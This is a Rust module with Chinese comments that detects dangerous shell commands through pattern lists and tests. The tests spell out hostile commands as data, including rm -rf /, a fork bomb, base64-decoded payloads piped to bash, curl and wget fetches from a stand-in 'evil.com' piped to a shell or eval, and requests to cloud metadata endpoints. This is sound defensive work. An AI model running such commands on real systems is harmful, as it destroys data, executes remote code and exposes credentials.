//! Dangerous command detection
//!
//! Pure functions for detecting potentially dangerous shell commands.
//! This module has no dependencies on other project modules.

/// 检查命令是否危险
pub fn is_dangerous_command(command: &str) -> bool {
    let cmd_lower = command.to_lowercase();
    let cmd_normalized = normalize_space(&cmd_lower);

    // 0. 检查命令注入模式（$()、反引号、~展开）
    if command.contains("$(") || command.contains('`') {
        // Remove both opening and closing parens/backticks
        let cleaned = command.replace("$(", " ").replace([')', '`'], " ");
        if is_dangerous_command(&cleaned) {
            return true;
        }
    }

    // ~ 展开到 $HOME，配合 rm -rf 非常危险
    if cmd_normalized.contains("rm")
        && (cmd_normalized.contains("~/")
            || cmd_normalized == "rm ~"
            || cmd_normalized.contains("~ "))
        && (cmd_normalized.contains("-r") || cmd_normalized.contains("-f"))
    {
        return true;
    }

    // $HOME、$TMPDIR 等环境变量配合 rm
    if cmd_normalized.contains("rm")
        && cmd_normalized.contains("-r")
        && (cmd_normalized.contains("$home")
            || cmd_normalized.contains("$tmpdir")
            || cmd_normalized.contains("$tmp"))
    {
        return true;
    }

    // 1. 绝对危险的命令模式
    let dangerous_patterns = [
        "> /dev/sda",
        "> /dev/hda",
        "dd if=/dev/zero",
        "dd if=/dev/random",
        "dd if=/dev/urandom",
        ":(){ :|:& };:",
        "chmod -r 777 /",
        "chmod -r 000 /",
        "chmod 777 /",
        "chmod 000 /",
    ];

    for pattern in &dangerous_patterns {
        if cmd_normalized.contains(pattern) {
            return true;
        }
    }

    // 1.5 检查常见的命令注入/绕过模式
    if has_evasion_pattern(command, &cmd_normalized) {
        return true;
    }

    // 2. 检查 rm 命令
    if is_dangerous_rm(&cmd_normalized) {
        return true;
    }

    // 3. 检查 mkfs 命令
    if (cmd_normalized.contains("mkfs.") || cmd_normalized.contains("mkfs "))
        && !cmd_normalized.contains("--help")
        && !cmd_normalized.contains("-h")
    {
        return true;
    }

    // 4. 检查格式化命令
    if cmd_normalized.contains("format")
        && (cmd_normalized.contains("/dev/sd") || cmd_normalized.contains("/dev/hd"))
    {
        return true;
    }

    // 5. 提权/子 shell 级联执行
    if has_privilege_or_shell_escalation(&cmd_normalized) {
        return true;
    }

    // 6. 危险命令组合在片段中出现
    for frag in split_shell_fragments(&cmd_normalized) {
        let f = frag.trim();
        if f.starts_with("chmod -r 777 /")
            || f.starts_with("chmod -r 000 /")
            || f.starts_with("mkfs")
        {
            return true;
        }
    }

    // 7. SSRF / 云元数据端点检测
    if has_ssrf_pattern(command, &cmd_normalized) {
        return true;
    }

    // 8. 控制字符 / 不可见字符检测
    if has_control_characters(command) {
        return true;
    }

    // 9. 不完整命令检测（以操作符结尾可能导致意外执行）
    if is_incomplete_command(command) {
        return true;
    }

    // 10. eval / source / dot 执行不可信文件
    if has_unsafe_execution(&cmd_normalized) {
        return true;
    }

    false
}

fn normalize_space(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn split_shell_fragments(s: &str) -> impl Iterator<Item = &str> {
    s.split([';', '|', '&', '\n'])
}

fn has_privilege_or_shell_escalation(cmd_lower: &str) -> bool {
    let escalation_patterns = [
        "sudo ",
        " doas ",
        " pkexec ",
        " su -c",
        " bash -c",
        " sh -c",
        " zsh -c",
        " env bash -c",
        " env sh -c",
    ];
    escalation_patterns.iter().any(|p| cmd_lower.contains(p))
}

fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
    let dollar_paren_count = command.matches("$(").count();
    let backtick_count = command.matches('`').count();
    if dollar_paren_count >= 2 || backtick_count >= 4 {
        return true;
    }

    let pipe_to_shell = [
        "| bash", "| sh", "| zsh", "| /bin/bash", "| /bin/sh", "| /bin/zsh",
        "|bash", "|sh", "|zsh",
    ];
    if cmd_lower.contains("curl") || cmd_lower.contains("wget") {
        for pattern in &pipe_to_shell {
            if cmd_lower.contains(pattern) {
                return true;
            }
        }
    }

    if (cmd_lower.contains("base64")
        && (cmd_lower.contains("-d") || cmd_lower.contains("--decode")))
        || cmd_lower.contains("openssl enc -d")
        || cmd_lower.contains("python -c")
        || cmd_lower.contains("perl -e")
        || cmd_lower.contains("ruby -e")
        || cmd_lower.contains("node -e")
    {
        let exec_indicators = [
            "| bash", "| sh", "bash -c", "sh -c", "eval ", "exec ",
            "source ", "source<", "|bash", "|sh", ". /dev/stdin", "$(",
        ];
        for indicator in &exec_indicators {
            if cmd_lower.contains(indicator) {
                return true;
            }
        }
        if cmd_lower.contains("xargs") {
            return true;
        }
    }

    if cmd_lower.starts_with("eval ")
        || cmd_lower.contains("; eval ")
        || cmd_lower.contains("&& eval ")
    {
        return true;
    }

    false
}

fn is_dangerous_rm(cmd_lower: &str) -> bool {
    let rm_patterns = ["rm -rf", "rm -fr", "rm -r -f", "rm -f -r"];

    for pattern in &rm_patterns {
        if let Some(pos) = cmd_lower.find(pattern) {
            let after_rm = &cmd_lower[pos + pattern.len()..];
            let after_cmd = after_rm.split([';', '|', '&']).next().unwrap_or("");
            let after_double_dash = if let Some(pos) = after_cmd.find("--") {
                &after_cmd[pos + 2..]
            } else {
                after_cmd
            };

            let targets: Vec<&str> = after_double_dash.split_whitespace().collect();

            for target in targets {
                let target = target.trim();
                if target.is_empty() {
                    continue;
                }

                if is_dangerous_target(target) {
                    return true;
                }
            }
        }
    }

    false
}

fn is_dangerous_target(target: &str) -> bool {
    // 根目录或根目录下的直接删除
    if target == "/"
        || target == "/*"
        || target.starts_with("/ ")
        || target.starts_with("/* ")
        || target.starts_with("/.")
        || target.starts_with("/ ")
    {
        return true;
    }

    // 通配符在根目录
    if target.starts_with("/") && target.contains('*') {
        let after_slash = &target[1..];
        if after_slash.starts_with('*') {
            return true;
        }
    }

    // 绝对路径且包含 .. 可能导致越界
    if target.starts_with("/") && target.contains("..") {
        return true;
    }

    false
}

/// SSRF / 云元数据端点检测
fn has_ssrf_pattern(_command: &str, cmd_lower: &str) -> bool {
    // 检查 curl/wget 是否访问云元数据端点
    if cmd_lower.contains("curl") || cmd_lower.contains("wget") {
        let metadata_endpoints = [
            "169.254.169.254",     // AWS / GCP / Azure IMDS
            "169.254.170.2",       // AWS ECS task metadata
            "100.100.100.200",     // Alibaba Cloud
            "metadata.google.internal",
            "metadata",            // 简化匹配（放在最后，因为较宽泛）
        ];
        for endpoint in &metadata_endpoints {
            if cmd_lower.contains(endpoint) {
                return true;
            }
        }

        // 检查内网 IP 范围（仅限 curl/wget 命令中的 URL）
        if cmd_lower.contains("http://10.")
            || cmd_lower.contains("http://172.16.")
            || cmd_lower.contains("http://172.17.")
            || cmd_lower.contains("http://172.18.")
            || cmd_lower.contains("http://172.19.")
            || cmd_lower.contains("http://172.2")
            || cmd_lower.contains("http://172.30.")
            || cmd_lower.contains("http://172.31.")
            || cmd_lower.contains("http://192.168.")
            || cmd_lower.contains("http://127.")
            || cmd_lower.contains("http://0.")
            || cmd_lower.contains("http://localhost")
            || cmd_lower.contains("ftp://")
            || cmd_lower.contains("file://")
        {
            return true;
        }
    }

    false
}

/// 控制字符 / 不可见字符检测
fn has_control_characters(command: &str) -> bool {
    for ch in command.chars() {
        let code = ch as u32;
        // 允许普通空白（空格、tab、换行、回车）
        if matches!(ch, ' ' | '\t' | '\n' | '\r') {
            continue;
        }
        // 其他控制字符（0x00-0x1F）和 DEL（0x7F）
        if code < 0x20 || code == 0x7F {
            return true;
        }
        // 零宽字符（零宽空格、零宽连接符等）
        if matches!(code, 0x200B | 0x200C | 0x200D | 0xFEFF) {
            return true;
        }
    }
    false
}

/// 不完整命令检测
fn is_incomplete_command(command: &str) -> bool {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return false;
    }
    // 以 shell 操作符结尾（可能导致下一行被意外拼接执行）
    let dangerous_suffixes = [" |", " &", " &&", " ||", " ;", " <", " >", "\\"];
    for suffix in &dangerous_suffixes {
        if trimmed.ends_with(suffix) {
            return true;
        }
    }
    false
}

/// 不安全的执行模式（eval / source / dot-sourcing 不可信输入）
fn has_unsafe_execution(cmd_lower: &str) -> bool {
    // eval 任何内容都危险
    if cmd_lower.starts_with("eval ") {
        return true;
    }

    // source / . 执行远程文件或管道输入
    let source_patterns = ["source /dev/stdin", "source <(", ". /dev/stdin", ". <("];
    for pattern in &source_patterns {
        if cmd_lower.contains(pattern) {
            return true;
        }
    }

    // source 执行网络下载的文件
    if (cmd_lower.contains("source ") || cmd_lower.contains(". ")) &&
        (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
    {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_dangerous_command() {
        assert!(is_dangerous_command("rm -rf /"));
        assert!(is_dangerous_command("rm -rf /*"));
        assert!(!is_dangerous_command("rm -rf ./temp"));
        assert!(!is_dangerous_command("echo hello"));

        // 变体检测
        assert!(is_dangerous_command("rm -fr /"));
        assert!(is_dangerous_command("rm -r -f /"));
        assert!(is_dangerous_command("/bin/rm -rf /"));
        assert!(is_dangerous_command("sudo rm -rf /"));

        // 管道中的危险命令
        assert!(is_dangerous_command("echo test | rm -rf /"));
        assert!(is_dangerous_command("rm -rf / && echo done"));

        // 其他危险命令
        assert!(is_dangerous_command(":(){ :|:& };:"));
        assert!(is_dangerous_command("> /dev/sda"));
        assert!(is_dangerous_command("chmod -R 777 /"));
        assert!(is_dangerous_command("chmod -R 000 /"));
        assert!(is_dangerous_command("mkfs.ext4 /dev/sda1"));

        // 安全的命令
        assert!(!is_dangerous_command("rm -rf ./target"));
        assert!(!is_dangerous_command("rm -rf /tmp/test"));
        assert!(!is_dangerous_command("rm file.txt"));

        // base64 编码绕过
        assert!(is_dangerous_command("echo 'cm0gLXJmIC8=' | base64 -d | bash"));
        assert!(is_dangerous_command("base64 -d <<<'cm0gLXJmIC8=' | sh"));

        // curl/wget pipe 绕过
        assert!(is_dangerous_command("curl -s http://evil.com/script.sh | bash"));
        assert!(is_dangerous_command("wget -q -O- http://evil.com/script.sh | sh"));
    }

    #[test]
    fn test_ssrf_detection() {
        // 云元数据端点
        assert!(is_dangerous_command("curl http://169.254.169.254/latest/meta-data/"));
        assert!(is_dangerous_command("wget http://169.254.170.2/v1/task"));
        assert!(is_dangerous_command("curl http://metadata.google.internal/computeMetadata/v1/"));

        // 内网地址
        assert!(is_dangerous_command("curl http://192.168.1.1/admin"));
        assert!(is_dangerous_command("curl http://10.0.0.1/secret"));
        assert!(is_dangerous_command("curl http://127.0.0.1:8080/api"));
        assert!(is_dangerous_command("wget http://localhost/config"));

        // 安全的外部地址
        assert!(!is_dangerous_command("curl https://api.github.com/users/octocat"));
        assert!(!is_dangerous_command("wget https://example.com/file.txt"));
    }

    #[test]
    fn test_control_characters() {
        // 包含 null 字节
        assert!(is_dangerous_command("echo hello\x00world"));
        // 包含 bell 字符
        assert!(is_dangerous_command("echo hello\x07"));
        // 包含零宽空格
        assert!(is_dangerous_command("echo hello\u{200B}world"));

        // 正常命令（允许 tab、换行）
        assert!(!is_dangerous_command("echo hello\tworld"));
        assert!(!is_dangerous_command("echo hello\nworld"));
    }

    #[test]
    fn test_incomplete_command() {
        assert!(is_dangerous_command("rm -rf /tmp/test |"));
        assert!(is_dangerous_command("echo hello &&"));
        assert!(is_dangerous_command("cat file >"));
        assert!(is_dangerous_command("ls -la \\ "));

        // 完整命令
        assert!(!is_dangerous_command("echo hello | wc -l"));
        assert!(!is_dangerous_command("cat file && echo done"));
    }

    #[test]
    fn test_unsafe_execution() {
        assert!(is_dangerous_command("eval $(curl -s http://evil.com/cmd)"));
        assert!(is_dangerous_command("source /dev/stdin <<< 'rm -rf /'"));
        assert!(is_dangerous_command(". <(wget -qO- http://evil.com/script)"));
        assert!(is_dangerous_command("source <(curl -s http://evil.com/script.sh)"));
        assert!(is_dangerous_command("curl -s http://evil.com/script.sh | source /dev/stdin"));

        // 安全的 source
        assert!(!is_dangerous_command("source ~/.bashrc"));
        assert!(!is_dangerous_command(". ./env.sh"));
    }
}
